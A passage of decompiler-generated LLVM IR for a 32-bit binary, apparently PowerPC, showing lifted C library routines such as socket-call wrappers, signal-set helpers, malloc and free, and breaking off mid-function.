  uselistorder i32 %v1_1000f8b4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1000f8ac, { 1, 0, 2 }
  uselistorder i32 %v0_1000f834, { 0, 5, 4, 1, 3, 2 }
  uselistorder i32 %v1_1000f778, { 1, 0, 2 }
  uselistorder i32 %v0_1000f734.pre, { 0, 2, 1 }
  uselistorder i32 %v1_1000f71c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %tmp19, { 0, 1, 3, 2 }
  uselistorder i32 %tmp18, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 20, 2, 3, 1, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 3, 4, 5, 6, 1, 9, 7, 8, 10, 11, 12, 13, 14, 16, 17, 15, 18, 19 }
  uselistorder i32* %ctr.global-to-local, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_1000f9ac, { 7, 4, 5, 6, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_1000f98c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000f928, { 1, 0 }
  uselistorder label %dec_label_pc_1000f8d4, { 1, 0 }
  uselistorder label %dec_label_pc_1000f734, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000f9d4 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268499428, i32* @lr, align 4
  %v2_1000f9e0 = call i32 @__socketcall(i32 3, i32 %v2_1000f9d4)
  ret i32 %v2_1000f9e0

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg3, i32* @r5, align 4
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000fa08 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268499480, i32* @lr, align 4
  %v2_1000fa14 = call i32 @__socketcall(i32 6, i32 %v2_1000fa08)
  ret i32 %v2_1000fa14

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_1000fa3c = ptrtoint i32* %stack_var_-40 to i32
  store i32 268499540, i32* @lr, align 4
  %v2_1000fa50 = call i32 @__socketcall(i32 15, i32 %v2_1000fa3c)
  ret i32 %v2_1000fa50

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000fa78 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268499596, i32* @lr, align 4
  %v2_1000fa88 = call i32 @__socketcall(i32 10, i32 %v2_1000fa78)
  ret i32 %v2_1000fa88

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000fab0 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268499652, i32* @lr, align 4
  %v2_1000fac0 = call i32 @__socketcall(i32 9, i32 %v2_1000fab0)
  ret i32 %v2_1000fac0

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_1000fae8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268499716, i32* @lr, align 4
  %v2_1000fb00 = call i32 @__socketcall(i32 11, i32 %v2_1000fae8)
  ret i32 %v2_1000fb00

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_1000fb28 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268499776, i32* @lr, align 4
  %v2_1000fb3c = call i32 @__socketcall(i32 14, i32 %v2_1000fb28)
  ret i32 %v2_1000fb3c

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000fb64 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268499828, i32* @lr, align 4
  %v2_1000fb70 = call i32 @__socketcall(i32 1, i32 %v2_1000fb64)
  ret i32 %v2_1000fb70

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32 (i32, i32)* @__socketcall, { 5, 4, 6, 0, 1, 3, 7, 2 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r4, align 4
  %arg1.off = add i32 %arg1, -1
  %tmp4 = icmp ult i32 %arg1.off, 64
  br i1 %tmp4, label %dec_label_pc_1000fbb4, label %dec_label_pc_1000fba0

dec_label_pc_1000fba0:                            ; preds = %entry
  %v0_1000fba0 = call i32 @__errno_location()
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_1000fbac = inttoptr i32 %v0_1000fba0 to i32*
  store i32 22, i32* %v2_1000fbac, align 4
  %v0_1000fbc0.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000fbbc

dec_label_pc_1000fbb4:                            ; preds = %entry
  %v0_1000fbb4 = call i32 @__sigaddset()
  store i32 %v0_1000fbb4, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000fbbc

dec_label_pc_1000fbbc:                            ; preds = %dec_label_pc_1000fba0, %dec_label_pc_1000fbb4
  %v0_1000fbc0 = phi i32 [ %v0_1000fbc0.pre, %dec_label_pc_1000fba0 ], [ %v0_1000fbb4, %dec_label_pc_1000fbb4 ]
  ret i32 %v0_1000fbc0

; uselistorder directives
  uselistorder label %dec_label_pc_1000fbbc, { 1, 0 }
}

define i32 @sigemptyset(i32 %arg1) local_unnamed_addr {
entry:
  store i32 268499944, i32* @lr, align 4
  %v3_1000fbe4 = call i32 @__GI_memset(i32 0, i32 128, i32 128)
  ret i32 0
}

define i32 @__bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v3_1000fbfc = icmp eq i32 %arg2, -1
  store i32 %arg1, i32* %r31.global-to-local, align 4
  br i1 %v3_1000fbfc, label %dec_label_pc_1000fc28, label %dec_label_pc_1000fc18

dec_label_pc_1000fc18:                            ; preds = %entry
  %tmp20 = icmp slt i32 %arg1, 1
  br i1 %tmp20, label %dec_label_pc_1000fc28, label %dec_label_pc_1000fc20

dec_label_pc_1000fc20:                            ; preds = %dec_label_pc_1000fc18
  %tmp21 = icmp slt i32 %arg1, 65
  br i1 %tmp21, label %dec_label_pc_1000fc58.lr.ph, label %dec_label_pc_1000fc28

dec_label_pc_1000fc28:                            ; preds = %dec_label_pc_1000fc20, %dec_label_pc_1000fc18, %entry
  %v0_1000fc28 = call i32 @__errno_location()
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_1000fc34 = inttoptr i32 %v0_1000fc28 to i32*
  store i32 22, i32* %v2_1000fc34, align 4
  %v0_1000fcc8.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000fcc4

dec_label_pc_1000fc58.lr.ph:                      ; preds = %dec_label_pc_1000fc20
  %v2_1000fc48 = ptrtoint i32* %stack_var_-296 to i32
  store i32 %v2_1000fc48, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-296, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v2_1000fc5822 = add i32 %v2_1000fc48, 128
  %v3_1000fc5823 = inttoptr i32 %v2_1000fc5822 to i32*
  store i32 0, i32* %v3_1000fc5823, align 4
  %v0_1000fc5c24 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000fc5c25 = add i32 %v0_1000fc5c24, -1
  store i32 %v1_1000fc5c25, i32* %r11.global-to-local, align 4
  %v1_1000fc6026 = mul i32 %v1_1000fc5c25, 4
  %v1_1000fc6427 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000fc6428 = add i32 %v1_1000fc6427, %v1_1000fc6026
  store i32 %v2_1000fc6428, i32* %r9.global-to-local, align 4
  %v0_1000fc6829 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000fc6830 = add i32 %v0_1000fc6829, -1
  store i32 %v1_1000fc6830, i32* %ctr.global-to-local, align 4
  %v2_1000fc6831 = icmp eq i32 %v1_1000fc6830, 0
  br i1 %v2_1000fc6831, label %dec_label_pc_1000fc6c, label %dec_label_pc_1000fc58.dec_label_pc_1000fc58_crit_edge

dec_label_pc_1000fc58.dec_label_pc_1000fc58_crit_edge: ; preds = %dec_label_pc_1000fc58.lr.ph, %dec_label_pc_1000fc58.dec_label_pc_1000fc58_crit_edge
  %v2_1000fc6432 = phi i32 [ %v2_1000fc64, %dec_label_pc_1000fc58.dec_label_pc_1000fc58_crit_edge ], [ %v2_1000fc6428, %dec_label_pc_1000fc58.lr.ph ]
  %v0_1000fc58.pre = load i32, i32* %r10.global-to-local, align 4
  %v2_1000fc58 = add i32 %v2_1000fc6432, 4
  %v3_1000fc58 = inttoptr i32 %v2_1000fc58 to i32*
  store i32 %v0_1000fc58.pre, i32* %v3_1000fc58, align 4
  %v0_1000fc5c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000fc5c = add i32 %v0_1000fc5c, -1
  store i32 %v1_1000fc5c, i32* %r11.global-to-local, align 4
  %v1_1000fc60 = mul i32 %v1_1000fc5c, 4
  %v1_1000fc64 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000fc64 = add i32 %v1_1000fc64, %v1_1000fc60
  store i32 %v2_1000fc64, i32* %r9.global-to-local, align 4
  %v0_1000fc68 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000fc68 = add i32 %v0_1000fc68, -1
  store i32 %v1_1000fc68, i32* %ctr.global-to-local, align 4
  %v2_1000fc68 = icmp eq i32 %v1_1000fc68, 0
  br i1 %v2_1000fc68, label %dec_label_pc_1000fc6c, label %dec_label_pc_1000fc58.dec_label_pc_1000fc58_crit_edge

dec_label_pc_1000fc6c:                            ; preds = %dec_label_pc_1000fc58.dec_label_pc_1000fc58_crit_edge, %dec_label_pc_1000fc58.lr.ph
  %v0_1000fc70.pre = load i32, i32* %r31.global-to-local, align 4
  %v2_1000fc6c = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v2_1000fc6c, i32* @r3, align 4
  store i32 %v0_1000fc70.pre, i32* @r4, align 4
  %v0_1000fc74 = call i32 @__sigaddset()
  %v1_1000fc78 = icmp slt i32 %v0_1000fc74, 0
  br i1 %v1_1000fc78, label %dec_label_pc_1000fcc0, label %dec_label_pc_1000fc80

dec_label_pc_1000fc80:                            ; preds = %dec_label_pc_1000fc6c
  %v0_1000fc84 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000fc8c = call i32 @__sigismember(i32 ptrtoint (i32* @global_var_1002ea90.657 to i32), i32 %v0_1000fc84)
  %v2_1000fc98 = ptrtoint i32* %stack_var_-156 to i32
  store i32 268500144, i32* @lr, align 4
  %v4_1000fcac = call i32 @__libc_sigaction(i32 %v0_1000fc84, i32* nonnull %stack_var_-296, i32 %v2_1000fc98)
  %v1_1000fcb0 = icmp slt i32 %v4_1000fcac, 0
  br i1 %v1_1000fcb0, label %dec_label_pc_1000fcc0, label %dec_label_pc_1000fcb8

dec_label_pc_1000fcb8:                            ; preds = %dec_label_pc_1000fc80
  %v3_1000fcb8 = load i32, i32* %stack_var_-156, align 4
  store i32 %v3_1000fcb8, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000fcc4

dec_label_pc_1000fcc0:                            ; preds = %dec_label_pc_1000fc80, %dec_label_pc_1000fc6c
  store i32 -1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000fcc4

dec_label_pc_1000fcc4:                            ; preds = %dec_label_pc_1000fcb8, %dec_label_pc_1000fc28, %dec_label_pc_1000fcc0
  %v0_1000fcc8 = phi i32 [ %v3_1000fcb8, %dec_label_pc_1000fcb8 ], [ %v0_1000fcc8.pre, %dec_label_pc_1000fc28 ], [ -1, %dec_label_pc_1000fcc0 ]
  ret i32 %v0_1000fcc8

; uselistorder directives
  uselistorder i32 %v1_1000fc68, { 1, 0 }
  uselistorder i32 %v2_1000fc64, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 5, 3, 4 }
  uselistorder i32* %r31.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r11.global-to-local, { 2, 3, 4, 0, 1 }
  uselistorder i32* %ctr.global-to-local, { 2, 3, 4, 0, 1 }
  uselistorder i32 65, { 2, 3, 4, 0, 1 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000fcc4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000fc58.dec_label_pc_1000fc58_crit_edge, { 1, 0 }
}

define i32 @__sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1000fcdc = add i32 %arg2, -1
  %v1_1000fce0 = call i32 @__asm_rlwinm(i32 %v1_1000fcdc, i32 29, i32 3, i32 29)
  %v1_1000fce4 = urem i32 %v1_1000fcdc, 32
  %v2_1000fce8 = add i32 %v1_1000fce0, %arg1
  %v3_1000fce8 = inttoptr i32 %v2_1000fce8 to i32*
  %v4_1000fce8 = load i32, i32* %v3_1000fce8, align 4
  %v3_1000fcf0 = shl i32 1, %v1_1000fce4
  %v2_1000fcf4 = and i32 %v4_1000fce8, %v3_1000fcf0
  %v2_1000fcf8 = icmp ne i32 %v2_1000fcf4, 0
  %v5_1000fcfc = zext i1 %v2_1000fcf8 to i32
  ret i32 %v5_1000fcfc
}

define i32 @__sigaddset() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %v0_1000fd04 = load i32, i32* @r4, align 4
  %v1_1000fd04 = add i32 %v0_1000fd04, -1
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_1000fd0c = call i32 @__asm_rlwinm(i32 %v1_1000fd04, i32 29, i32 3, i32 29)
  %v1_1000fd10 = urem i32 %v1_1000fd04, 32
  %v1_1000fd14 = load i32, i32* @r3, align 4
  %v2_1000fd14 = add i32 %v1_1000fd14, %v1_1000fd0c
  %v3_1000fd14 = inttoptr i32 %v2_1000fd14 to i32*
  %v4_1000fd14 = load i32, i32* %v3_1000fd14, align 4
  %v0_1000fd18 = load i32, i32* %r0.global-to-local, align 4
  %v3_1000fd18 = shl i32 %v0_1000fd18, %v1_1000fd10
  store i32 %v3_1000fd18, i32* %r0.global-to-local, align 4
  %v2_1000fd1c = or i32 %v3_1000fd18, %v4_1000fd14
  store i32 %v2_1000fd1c, i32* %v3_1000fd14, align 4
  ret i32 0
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1000fd2c = add i32 %arg2, -1
  %v1_1000fd34 = call i32 @__asm_rlwinm(i32 %v1_1000fd2c, i32 29, i32 3, i32 29)
  %v1_1000fd38 = urem i32 %v1_1000fd2c, 32
  %v2_1000fd3c = add i32 %v1_1000fd34, %arg1
  %v3_1000fd3c = inttoptr i32 %v2_1000fd3c to i32*
  %v4_1000fd3c = load i32, i32* %v3_1000fd3c, align 4
  %v3_1000fd40 = shl i32 -2, %v1_1000fd38
  %v4_1000fd40 = sub nsw i32 32, %v1_1000fd38
  %v5_1000fd40 = lshr i32 -2, %v4_1000fd40
  %v6_1000fd40 = or i32 %v5_1000fd40, %v3_1000fd40
  %v2_1000fd44 = and i32 %v6_1000fd40, %v4_1000fd3c
  store i32 %v2_1000fd44, i32* %v3_1000fd3c, align 4
  ret i32 0
}

define i32 @malloc() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_1000fd54 = load i32, i32* @r3, align 4
  %v3_1000fd54 = icmp eq i32 %v0_1000fd54, 0
  br i1 %v3_1000fd54, label %dec_label_pc_1000fd6c, label %dec_label_pc_1000fd70

dec_label_pc_1000fd6c:                            ; preds = %entry
  br label %dec_label_pc_1000fd70

dec_label_pc_1000fd70:                            ; preds = %entry, %dec_label_pc_1000fd6c
  %v0_1000fd80 = phi i32 [ 1, %dec_label_pc_1000fd6c ], [ %v0_1000fd54, %entry ]
  %v3_1000fd74 = icmp ugt i32 %v0_1000fd80, -8
  br i1 %v3_1000fd74, label %dec_label_pc_1000fe84, label %dec_label_pc_1000fd7c

dec_label_pc_1000fd7c:                            ; preds = %dec_label_pc_1000fd70
  %v1_1000fd80 = add i32 %v0_1000fd80, 4
  store i32 ptrtoint (i32* @global_var_1002ea60.658 to i32), i32* @r29, align 4
  store i32 %v1_1000fd80, i32* %stack_var_-40, align 4
  %v0_1000fd90 = call i32 @__pthread_return_0()
  %v2_1000fd98 = ptrtoint i32* %stack_var_-40 to i32
  %v3_1000fda0 = call i32 @__heap_alloc(i32* inttoptr (i32 268601280 to i32*), i32 %v2_1000fd98)
  store i32 %v3_1000fda0, i32* %r31.global-to-local, align 4
  %v0_1000fdac = call i32 @__pthread_return_0()
  %v3_1000fdb0 = icmp eq i32 %v3_1000fda0, 0
  br i1 %v3_1000fdb0, label %dec_label_pc_1000fdb8, label %dec_label_pc_1000fe68.thread

dec_label_pc_1000fe68.thread:                     ; preds = %dec_label_pc_1000fd7c
  br label %dec_label_pc_1000fe7c

dec_label_pc_1000fdb8:                            ; preds = %dec_label_pc_1000fd7c
  %v3_1000fdbc = load i32, i32* @global_var_10028820.604, align 4
  store i32 %v3_1000fdbc, i32* %r31.global-to-local, align 4
  %v3_1000fdc0 = load i32, i32* %stack_var_-40, align 4
  %v2_1000fdc4 = icmp ult i32 %v3_1000fdc0, %v3_1000fdbc
  br i1 %v2_1000fdc4, label %dec_label_pc_1000fddc, label %dec_label_pc_1000fdcc

dec_label_pc_1000fdcc:                            ; preds = %dec_label_pc_1000fdb8
  %v1_1000fdd0 = sub i32 0, %v3_1000fdbc
  %v2_1000fdcc = add i32 %v3_1000fdbc, -1
  %v1_1000fdd4 = add i32 %v2_1000fdcc, %v3_1000fdc0
  %v2_1000fdd8 = and i32 %v1_1000fdd4, %v1_1000fdd0
  store i32 %v2_1000fdd8, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000fddc

dec_label_pc_1000fddc:                            ; preds = %dec_label_pc_1000fdb8, %dec_label_pc_1000fdcc
  %v0_1000fde8 = call i32 @__pthread_return_0()
  %v0_1000fdec = load i32, i32* %r31.global-to-local, align 4
  store i32 268500468, i32* @lr, align 4
  %v1_1000fdf0 = call i32 @__GI_sbrk(i32 %v0_1000fdec)
  %v3_1000fdf4 = icmp eq i32 %v1_1000fdf0, -1
  br i1 %v3_1000fdf4, label %dec_label_pc_1000fe14, label %dec_label_pc_1000fdfc

dec_label_pc_1000fdfc:                            ; preds = %dec_label_pc_1000fddc
  %v1_1000fdfc = add i32 %v1_1000fdf0, 3
  %v1_1000fe00 = call i32 @__asm_rlwinm(i32 %v1_1000fdfc, i32 0, i32 0, i32 29)
  store i32 %v1_1000fe00, i32* @r30, align 4
  %v4_1000fe04 = icmp eq i32 %v1_1000fe00, %v1_1000fdf0
  br i1 %v4_1000fe04, label %dec_label_pc_1000fe14, label %dec_label_pc_1000fe0c

dec_label_pc_1000fe0c:                            ; preds = %dec_label_pc_1000fdfc
  %v2_1000fe0c = sub i32 %v1_1000fe00, %v1_1000fdf0
  store i32 268500500, i32* @lr, align 4
  %v1_1000fe10 = call i32 @__GI_sbrk(i32 %v2_1000fe0c)
  br label %dec_label_pc_1000fe14

dec_label_pc_1000fe14:                            ; preds = %dec_label_pc_1000fdfc, %dec_label_pc_1000fddc, %dec_label_pc_1000fe0c
  %v0_1000fe1c = call i32 @__pthread_return_0()
  %v0_1000fe20 = load i32, i32* @r30, align 4
  %v3_1000fe20 = icmp eq i32 %v0_1000fe20, -1
  br i1 %v3_1000fe20, label %dec_label_pc_1000fe84, label %dec_label_pc_1000fe68

dec_label_pc_1000fe68:                            ; preds = %dec_label_pc_1000fe14
  store i32 ptrtoint (i32* @global_var_1002ea60.658 to i32), i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_100287c0 to i32), i32* @r29, align 4
  %v0_1000fe3c = call i32 @__pthread_return_0()
  %v0_1000fe40 = load i32, i32* @r31, align 4
  %v0_1000fe44 = load i32, i32* @r30, align 4
  %v0_1000fe48 = load i32, i32* @r29, align 4
  store i32 268500560, i32* @lr, align 4
  %v3_1000fe4c = inttoptr i32 %v0_1000fe48 to i32*
  %v4_1000fe4c = call i32 @__heap_free(i32* %v3_1000fe4c, i32 %v0_1000fe44, i32 %v0_1000fe40)
  %v0_1000fe50 = load i32, i32* @r29, align 4
  %v2_1000fe58 = inttoptr i32 %v0_1000fe50 to i32*
  %v3_1000fe58 = call i32 @__heap_alloc(i32* %v2_1000fe58, i32 %v2_1000fd98)
  store i32 %v3_1000fe58, i32* %r31.global-to-local, align 4
  %v0_1000fe64 = call i32 @__pthread_return_0()
  %v3_1000fe68 = icmp eq i32 %v3_1000fe58, 0
  br i1 %v3_1000fe68, label %dec_label_pc_1000fe7c.thread, label %dec_label_pc_1000fe7c

dec_label_pc_1000fe7c.thread:                     ; preds = %dec_label_pc_1000fe68
  br label %dec_label_pc_1000fe84

dec_label_pc_1000fe7c:                            ; preds = %dec_label_pc_1000fe68, %dec_label_pc_1000fe68.thread
  %v0_1000fe7c.pr6 = phi i32 [ %v3_1000fda0, %dec_label_pc_1000fe68.thread ], [ %v3_1000fe58, %dec_label_pc_1000fe68 ]
  %v3_1000fe70 = load i32, i32* %stack_var_-40, align 4
  %v2_1000fe74 = inttoptr i32 %v0_1000fe7c.pr6 to i32*
  store i32 %v3_1000fe70, i32* %v2_1000fe74, align 4
  %v0_1000fe78 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000fe78 = add i32 %v0_1000fe78, 4
  store i32 %v1_1000fe78, i32* @r31, align 4
  %v3_1000fe7c = icmp eq i32 %v1_1000fe78, 0
  br i1 %v3_1000fe7c, label %dec_label_pc_1000fe84, label %dec_label_pc_1000fe94

dec_label_pc_1000fe84:                            ; preds = %dec_label_pc_1000fe7c.thread, %dec_label_pc_1000fe7c, %dec_label_pc_1000fe14, %dec_label_pc_1000fd70
  %v0_1000fe84 = call i32 @__errno_location()
  %v2_1000fe8c = inttoptr i32 %v0_1000fe84 to i32*
  store i32 12, i32* %v2_1000fe8c, align 4
  store i32 0, i32* @r31, align 4
  br label %dec_label_pc_1000fe94

dec_label_pc_1000fe94:                            ; preds = %dec_label_pc_1000fe7c, %dec_label_pc_1000fe84
  %v0_1000fe98 = phi i32 [ %v1_1000fe78, %dec_label_pc_1000fe7c ], [ 0, %dec_label_pc_1000fe84 ]
  ret i32 %v0_1000fe98

; uselistorder directives
  uselistorder i32 %v1_1000fe78, { 1, 0, 2 }
  uselistorder i32 %v1_1000fe00, { 1, 0, 2 }
  uselistorder i32 %v1_1000fdf0, { 1, 0, 2, 3 }
  uselistorder i32 %v3_1000fdbc, { 1, 0, 2, 3 }
  uselistorder i32 %v3_1000fda0, { 1, 0, 2 }
  uselistorder i32* %stack_var_-40, { 0, 1, 3, 2 }
  uselistorder i32* %r31.global-to-local, { 4, 0, 2, 1, 3, 5 }
  uselistorder label %dec_label_pc_1000fe94, { 1, 0 }
  uselistorder label %dec_label_pc_1000fe84, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1000fe14, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000fddc, { 1, 0 }
  uselistorder label %dec_label_pc_1000fd70, { 1, 0 }
}

define i32 @free() local_unnamed_addr {
entry:
  %v0_1000feac = load i32, i32* @r3, align 4
  %v3_1000feac = icmp eq i32 %v0_1000feac, 0
  br i1 %v3_1000feac, label %dec_label_pc_1000ff98, label %dec_label_pc_1000fec4

dec_label_pc_1000fec4:                            ; preds = %entry
  %v1_1000fec8 = add i32 %v0_1000feac, -4
  %v2_1000fec8 = inttoptr i32 %v1_1000fec8 to i32*
  %v3_1000fec8 = load i32, i32* %v2_1000fec8, align 4
  store i32 %v3_1000fec8, i32* @r28, align 4
  store i32 268632064, i32* @r26, align 4
  %v0_1000fedc = call i32 @__pthread_return_0()
  %v0_1000fee4 = load i32, i32* @r28, align 4
  store i32 268500720, i32* @lr, align 4
  %v4_1000feec = call i32 @__heap_free(i32* nonnull @global_var_100287c0, i32 %v1_1000fec8, i32 %v0_1000fee4)
  %v3_1000fef4 = load i32, i32* @global_var_10028820.604, align 4
  store i32 %v4_1000feec, i32* @r29, align 4
  %v1_1000fefc = inttoptr i32 %v4_1000feec to i32*
  %v2_1000fefc = load i32, i32* %v1_1000fefc, align 4
  store i32 %v2_1000fefc, i32* @r27, align 4
  %v1_1000ff00 = mul i32 %v3_1000fef4, 8
  %v2_1000ff04 = icmp ult i32 %v2_1000fefc, %v1_1000ff00
  br i1 %v2_1000ff04, label %dec_label_pc_1000ff38, label %dec_label_pc_1000ff0c

dec_label_pc_1000ff0c:                            ; preds = %dec_label_pc_1000fec4
  store i32 ptrtoint (i32* @global_var_1002eb10.661 to i32), i32* @r28, align 4
  %v0_1000ff1c = call i32 @__pthread_return_0()
  store i32 268500776, i32* @lr, align 4
  %v1_1000ff24 = call i32 @__GI_sbrk(i32 0)
  %v0_1000ff28 = load i32, i32* @r31, align 4
  %v4_1000ff28 = icmp eq i32 %v0_1000ff28, %v1_1000ff24
  br i1 %v4_1000ff28, label %dec_label_pc_1000ff40, label %dec_label_pc_1000ff30

dec_label_pc_1000ff30:                            ; preds = %dec_label_pc_1000ff0c
  %v0_1000ff34 = call i32 @__pthread_return_0()
  br label %dec_label_pc_1000ff38

dec_label_pc_1000ff38:                            ; preds = %dec_label_pc_1000fec4, %dec_label_pc_1000ff30
  br label %dec_label_pc_1000ff94

dec_label_pc_1000ff40:                            ; preds = %dec_label_pc_1000ff0c
  %v0_1000ff40 = load i32, i32* @r29, align 4
  %v1_1000ff40 = add i32 %v0_1000ff40, 4
  %v2_1000ff40 = inttoptr i32 %v1_1000ff40 to i32*
  %v3_1000ff40 = load i32, i32* %v2_1000ff40, align 4
  %v3_1000ff44 = icmp eq i32 %v3_1000ff40, 0
  br i1 %v3_1000ff44, label %dec_label_pc_1000ff54, label %dec_label_pc_1000ff4c

dec_label_pc_1000ff4c:                            ; preds = %dec_label_pc_1000ff40
  %v1_1000ff4c = add i32 %v0_1000ff40, 8
  %v2_1000ff4c = inttoptr i32 %v1_1000ff4c to i32*
  %v3_1000ff4c = load i32, i32* %v2_1000ff4c, align 4
  %v2_1000ff50 = add i32 %v3_1000ff40, 8
  %v3_1000ff50 = inttoptr i32 %v2_1000ff50 to i32*
  store i32 %v3_1000ff4c, i32* %v3_1000ff50, align 4
  %v0_1000ff54.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000ff54

dec_label_pc_1000ff54:                            ; preds = %dec_label_pc_1000ff40, %dec_label_pc_1000ff4c
  %v0_1000ff54 = phi i32 [ %v0_1000ff40, %dec_label_pc_1000ff40 ], [ %v0_1000ff54.pre, %dec_label_pc_1000ff4c ]
  %v1_1000ff54 = add i32 %v0_1000ff54, 8
  %v2_1000ff54 = inttoptr i32 %v1_1000ff54 to i32*
  %v3_1000ff54 = load i32, i32* %v2_1000ff54, align 4
  %v1_1000ff58 = add i32 %v0_1000ff54, 4
  %v2_1000ff58 = inttoptr i32 %v1_1000ff58 to i32*
  %v3_1000ff58 = load i32, i32* %v2_1000ff58, align 4
  %v3_1000ff5c = icmp eq i32 %v3_1000ff54, 0
  br i1 %v3_1000ff5c, label %dec_label_pc_1000ff6c, label %dec_label_pc_1000ff64

dec_label_pc_1000ff64:                            ; preds = %dec_label_pc_1000ff54
  %v2_1000ff64 = add i32 %v3_1000ff54, 4
  %v3_1000ff64 = inttoptr i32 %v2_1000ff64 to i32*
  store i32 %v3_1000ff58, i32* %v3_1000ff64, align 4
  br label %dec_label_pc_1000ff70

dec_label_pc_1000ff6c:                            ; preds = %dec_label_pc_1000ff54
  store i32 %v3_1000ff58, i32* @global_var_100287c0, align 4
  br label %dec_label_pc_1000ff70

dec_label_pc_1000ff70:                            ; preds = %dec_label_pc_1000ff64, %dec_label_pc_1000ff6c
